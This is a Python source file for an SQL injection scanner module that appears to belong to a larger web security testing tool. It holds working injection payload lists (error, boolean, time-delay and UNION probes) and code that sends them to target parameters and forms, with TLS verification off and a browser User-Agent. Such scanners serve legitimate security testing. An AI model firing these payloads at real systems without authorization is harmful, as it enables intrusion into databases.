"""
SQLiModule — Real SQL Injection detection engine.

Detection methods (in order of reliability):
  1. Error-based   — DB error strings appear in response
  2. Boolean-based — response differs between true/false conditions
  3. Time-based    — SLEEP/WAITFOR causes measurable delay
  4. Union-based   — UNION SELECT reflects column count data

Zero false positives policy:
  - Error-based:  only report when a known DB error string is found
  - Boolean:      require response length/content to differ by >10% AND same status code
  - Time-based:   require 3+ seconds delay, test twice for confirmation
"""

import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None


# ─── Error signatures per database ───────────────────────────────────────────

DB_ERRORS = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"mysql_fetch_array\(\)",
        r"mysql_num_rows\(\)",
        r"supplied argument is not a valid mysql",
        r"column count doesn't match",
        r"unknown column",
        r"mysql server version for the right syntax",
        r"mysql_fetch",
        r"division by zero",
    ],
    "PostgreSQL": [
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"postgresql.*error",
        r"unterminated quoted string",
        r"syntax error at or near",
        r"invalid input syntax for",
        r"pg_fetch_array",
        r"division by zero",
    ],
    "MSSQL": [
        r"unclosed quotation mark after the character string",
        r"incorrect syntax near",
        r"microsoft sql server",
        r"mssql_query\(\)",
        r"odbc sql server driver",
        r"sqlstate\[42000\]",
        r"syntax error converting",
        r"\[sqlserver\]",
    ],
    "Oracle": [
        r"ora-\d{4,5}",
        r"oracle error",
        r"oracle.*driver",
        r"oracle.*exception",
        r"quoted string not properly terminated",
        r"sql command not properly ended",
    ],
    "SQLite": [
        r"sqlite_exception",
        r"sqlite error",
        r"sqlite3::",
        r"system.data.sqlite",
        r"unrecognized token",
    ],
    "Generic": [
        r"sql syntax",
        r"sql error",
        r"syntax error.*sql",
        r"database error",
        r"db error",
        r"query failed",
        r"invalid query",
        r"unexpected end of sql command",
        r"error in your query",
    ],
}

# Flatten for quick searching
ALL_ERROR_PATTERNS = []
DB_ERROR_MAP = {}
for db, patterns in DB_ERRORS.items():
    for p in patterns:
        ALL_ERROR_PATTERNS.append(re.compile(p, re.I))
        DB_ERROR_MAP[p] = db


# ─── Payload sets ─────────────────────────────────────────────────────────────

# Error-triggering payloads
ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "';",
    "'--",
    "'-- -",
    "' OR '1'='1",
    "' OR 1=1--",
    "1'",
    "1\"",
    "1`",
    "1\\",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=1--",
    "' AND SLEEP(0)--",
    "1' AND '1'='1",
    "admin'--",
    "') OR ('1'='1",
    "1; SELECT 1",
    "1 UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 999--",    # Column count error
]

# Boolean condition pairs (true_payload, false_payload)
BOOLEAN_PAIRS = [
    ("' OR '1'='1'--",      "' OR '1'='2'--"),
    ("' OR 1=1--",          "' OR 1=2--"),
    ("1' AND '1'='1'--",    "1' AND '1'='2'--"),
    ("1 AND 1=1",           "1 AND 1=2"),
    ("1' AND 1=1--",        "1' AND 1=2--"),
    ("' OR 'x'='x",         "' OR 'x'='y"),
    ("1 OR 1=1",            "1 OR 1=2"),
]

# Time-based payloads (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
TIME_PAYLOADS = [
    ("' AND SLEEP(4)--",                4, "MySQL"),
    ("' AND SLEEP(4)-- -",              4, "MySQL"),
    ("1' AND SLEEP(4)--",               4, "MySQL"),
    ("'; WAITFOR DELAY '0:0:4'--",      4, "MSSQL"),
    ("1; WAITFOR DELAY '0:0:4'--",      4, "MSSQL"),
    ("' OR SLEEP(4)--",                 4, "MySQL"),
    ("1 AND SLEEP(4)",                  4, "MySQL"),
    ("'; SELECT pg_sleep(4)--",         4, "PostgreSQL"),
    ("' AND 1=(SELECT 1 FROM pg_sleep(4))--", 4, "PostgreSQL"),
    ("' OR 1=1 AND SLEEP(4)--",         4, "MySQL"),
]

# Union-based detection
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,@@version,3--",
    "' UNION ALL SELECT NULL--",
]


from modules import BaseModule


class SQLiModule(BaseModule):
    NAME = "SQLi Scanner"

    def __init__(self, target, db, ui, context, timeout=12, delay=0.3,
                 threads=5, verbose=False, ai=None, output_dir=None):
        self.target     = target
        self.db         = db
        self.ui         = ui
        self.ctx        = context
        self.timeout    = timeout
        self.delay      = delay
        self.threads    = threads
        self.verbose    = verbose
        self.ai         = ai
        self.output_dir = output_dir
        self.base_url   = self.ctx.get("base_url") or (
            f"https://{target}" if not target.startswith("http") else target
        )
        self.session    = self._make_session()
        self.found      = []

    def _make_session(self):
        if not requests:
            return None
        s = requests.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        s.verify = False
        return s

    # ─────────────────────────────────────────────────────────────────────────
    def run(self):
        self.ui.section("SQLi Scanner — SQL Injection Detection")
        if not requests:
            self.ui.error("requests not installed. Run: pip install requests")
            return

        try:
            import urllib3
            urllib3.disable_warnings()
        except Exception:
            pass

        endpoints = self._collect_endpoints()
        self.ui.info(f"Testing {len(endpoints)} parameter(s) for SQL injection")

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self._test_endpoint, ep): ep for ep in endpoints}
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    if self.verbose:
                        self.ui.error(f"SQLi thread error: {e}")

        if not self.found:
            self.ui.info("No confirmed SQL injection vulnerabilities found.")
        else:
            self.ui.ok(f"SQLi scan complete — {len(self.found)} confirmed finding(s)")

    # ─────────────────────────────────────────────────────────────────────────
    def _collect_endpoints(self):
        endpoints = []
        seen = set()

        raw_eps = self.ctx.get("endpoints", []) + self.ctx.get("urls", [])
        if not raw_eps:
            raw_eps = [self.base_url]

        # Parse existing GET params
        for ep in raw_eps:
            try:
                if not ep.startswith("http"):
                    ep = self.base_url.rstrip("/") + "/" + ep.lstrip("/")
                parsed = urllib.parse.urlparse(ep)
                qs = urllib.parse.parse_qs(parsed.query)
                if qs:
                    base_url = parsed.scheme + "://" + parsed.netloc + parsed.path
                    for param, vals in qs.items():
                        key = (base_url, param, "GET")
                        if key not in seen:
                            seen.add(key)
                            endpoints.append({
                                "url": base_url,
                                "method": "GET",
                                "param": param,
                                "original_value": vals[0],
                                "other_params": {k: v[0] for k, v in qs.items() if k != param}
                            })
            except Exception:
                continue

        # Probe common numeric and string params
        common_int_params  = ["id", "page", "pid", "uid", "user_id", "item", "product",
                               "cat", "category", "p", "post", "article", "news", "thread"]
        common_str_params  = ["q", "search", "s", "query", "name", "username", "email",
                               "keyword", "title", "filter", "sort", "order", "lang"]

        for p in common_int_params:
            key = (self.base_url, p, "GET")
            if key not in seen:
                seen.add(key)
                endpoints.append({
                    "url": self.base_url,
                    "method": "GET",
                    "param": p,
                    "original_value": "1",
                    "other_params": {}
                })

        for p in common_str_params:
            key = (self.base_url, p, "GET")
            if key not in seen:
                seen.add(key)
                endpoints.append({
                    "url": self.base_url,
                    "method": "GET",
                    "param": p,
                    "original_value": "test",
                    "other_params": {}
                })

        # Forms from context
        for form in self.ctx.get("forms", []):
            furl   = form.get("action", self.base_url)
            method = form.get("method", "POST").upper()
            for inp in form.get("inputs", {}).keys():
                key = (furl, inp, method)
                if key not in seen:
                    seen.add(key)
                    endpoints.append({
                        "url": furl,
                        "method": method,
                        "param": inp,
                        "original_value": "1",
                        "other_params": {k: v for k, v in form.get("inputs", {}).items() if k != inp}
                    })

        return endpoints

    # ─────────────────────────────────────────────────────────────────────────
    def _test_endpoint(self, ep):
        url    = ep["url"]
        method = ep["method"]
        param  = ep["param"]
        orig   = ep["original_value"]
        other  = ep["other_params"]

        # 1. Get baseline response
        baseline = self._send(url, method, param, orig, other)
        if not baseline:
            return

        # 2. Error-based detection
        result = self._test_error_based(url, method, param, orig, other, baseline)
        if result:
            self._report_finding(url, method, param, result["payload"],
                                  result["technique"], result["db_type"],
                                  result.get("evidence", ""), "critical", "9.8")
            return  # Don't pile on more findings for same param

        # 3. Boolean-based detection
        result = self._test_boolean_based(url, method, param, orig, other, baseline)
        if result:
            self._report_finding(url, method, param, result["payload"],
                                  result["technique"], result["db_type"],
                                  result.get("evidence", ""), "high", "8.8")
            return

        # 4. Time-based detection (only if above didn't find anything)
        result = self._test_time_based(url, method, param, orig, other)
        if result:
            self._report_finding(url, method, param, result["payload"],
                                  result["technique"], result["db_type"],
                                  result.get("evidence", ""), "critical", "9.8")

    # ─────────────────────────────────────────────────────────────────────────
    def _test_error_based(self, url, method, param, orig, other, baseline):
        for payload in ERROR_PAYLOADS:
            try:
                resp = self._send(url, method, param, payload, other)
                if not resp:
                    continue

                db_type, matched_pattern = self._check_db_errors(resp.text)
                if db_type:
                    # Extra validation: baseline should NOT have had this error
                    base_db, _ = self._check_db_errors(baseline.text)
                    if base_db:
                        continue  # Error in baseline too — not injected

                    # Optional AI augmentation: confirm DB type / weed out FPs.
                    if self.ai and self.ai.enabled:
                        try:
                            verdict = self.ai.analyze_sqli_error(url, param, resp.text)
                            if verdict:
                                self.ui.ai(verdict.split("\n")[0][:200])
                        except Exception:
                            pass

                    if self.verbose:
                        self.ui.warn(f"Error-based SQLi: {url} param={param} DB={db_type}")
                    return {
                        "payload": payload,
                        "technique": "Error-based",
                        "db_type": db_type,
                        "evidence": f"DB error pattern matched: {matched_pattern}"
                    }

                time.sleep(self.delay)
            except Exception:
                continue
        return None

    def _test_boolean_based(self, url, method, param, orig, other, baseline):
        baseline_len = len(baseline.text)

        for true_payload, false_payload in BOOLEAN_PAIRS:
            try:
                resp_true  = self._send(url, method, param, true_payload, other)
                resp_false = self._send(url, method, param, false_payload, other)

                if not resp_true or not resp_false:
                    continue

                len_true  = len(resp_true.text)
                len_false = len(resp_false.text)

                # Condition 1: same HTTP status (not a WAF redirect)
                if resp_true.status_code != resp_false.status_code:
                    continue

                # Condition 2: true response resembles baseline
                baseline_diff = abs(len_true - baseline_len)
                condition_diff = abs(len_true - len_false)

                # Require meaningful difference (>50 chars or >10% of page)
                threshold = max(50, baseline_len * 0.05)
                if condition_diff < threshold:
                    continue

                # Condition 3: true payload response closer to baseline than
                # the false payload response (classic boolean-blind signature).
                false_diff = abs(len_false - baseline_len)
                true_diff  = abs(len_true - baseline_len)
                if len_true == len_false:
                    continue
                if true_diff >= false_diff:
                    # 'true' is not closer to baseline than 'false' -> not a
                    # convincing boolean-blind signal, skip to avoid FPs.
                    continue

                if self.verbose:
                    self.ui.warn(f"Boolean SQLi candidate: {url} param={param} "
                                 f"true_len={len_true} false_len={len_false} diff={condition_diff}")

                return {
                    "payload": true_payload,
                    "technique": "Boolean-based blind",
                    "db_type": "Unknown (boolean inference)",
                    "evidence": (
                        f"True condition response length: {len_true}, "
                        f"False condition: {len_false}, "
                        f"Baseline: {baseline_len}, "
                        f"Difference: {condition_diff} chars"
                    )
                }
            except Exception:
                continue
        return None

    def _test_time_based(self, url, method, param, orig, other):
        for payload, sleep_sec, db_type in TIME_PAYLOADS:
            try:
                t0   = time.time()
                resp = self._send(url, method, param, payload, other, timeout=sleep_sec + 8)
                elapsed = time.time() - t0

                if elapsed < sleep_sec - 0.5:
                    time.sleep(self.delay)
                    continue

                # Confirm with a second request
                self.ui.warn(f"Time-based candidate ({elapsed:.1f}s): {url} param={param} — confirming...")
                t1   = time.time()
                resp2 = self._send(url, method, param, payload, other, timeout=sleep_sec + 8)
                elapsed2 = time.time() - t1

                if elapsed2 >= sleep_sec - 0.5:
                    if self.verbose:
                        self.ui.warn(f"Time-based SQLi confirmed ({elapsed2:.1f}s)")
                    return {
                        "payload": payload,
                        "technique": f"Time-based blind ({db_type})",
                        "db_type": db_type,
                        "evidence": (
                            f"Response delayed {elapsed:.2f}s on first test, "
                            f"{elapsed2:.2f}s on confirmation. "
                            f"Expected delay: {sleep_sec}s."
                        )
                    }

                time.sleep(self.delay)
            except Exception:
                continue
        return None

    # ─────────────────────────────────────────────────────────────────────────
    def _send(self, url, method, param, value, other_params, timeout=None):
        t = timeout or self.timeout
        try:
            params = {**other_params, param: value}
            if method == "GET":
                return self.session.get(url, params=params, timeout=t)
            else:
                return self.session.post(url, data=params, timeout=t)
        except RequestException:
            return None

    def _check_db_errors(self, body):
        body_lower = body.lower()
        for db, patterns in DB_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, body_lower):
                    return db, pattern
        return None, None

    # ─────────────────────────────────────────────────────────────────────────
    def _report_finding(self, url, method, param, payload, technique, db_type,
                         evidence, severity, cvss):
        title = f"SQL Injection ({technique}) in '{param}' parameter"
        desc  = (
            f"The '{param}' parameter in a {method} request to {url} is vulnerable to "
            f"{technique} SQL injection. Database fingerprinted as: {db_type}. "
            f"An attacker can extract the entire database, bypass authentication, "
            f"read/write server files, and potentially achieve remote code execution."
        )
        remediation = (
            "1. Use parameterized queries / prepared statements — NEVER concatenate user input into SQL. "
            "2. Apply input validation and whitelist expected value formats. "
            "3. Use an ORM that handles escaping automatically. "
            "4. Limit DB user permissions (principle of least privilege). "
            "5. Enable WAF rules for SQL injection patterns."
        )
        refs = [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://portswigger.net/web-security/sql-injection",
        ]

        added = self.db.add(
            title=title,
            severity=severity,
            url=url,
            module=self.NAME,
            description=desc,
            remediation=remediation,
            cvss=cvss,
            evidence=[evidence] if evidence else [],
            references=refs,
            confidence="high",
        )
        if added:
            self.found.append(url)
            self.ui.find(severity, title, url)
            self.ui.bullet(f"Param: {param}  |  Technique: {technique}  |  DB: {db_type}", indent=12)
            self.ui.bullet(f"Payload: {payload}", indent=12)
            self.ui.bullet(f"Evidence: {evidence}", indent=12)
            self.ctx.setdefault("sqli_findings", []).append({
                "url": url, "param": param, "payload": payload,
                "technique": technique, "db_type": db_type
            })
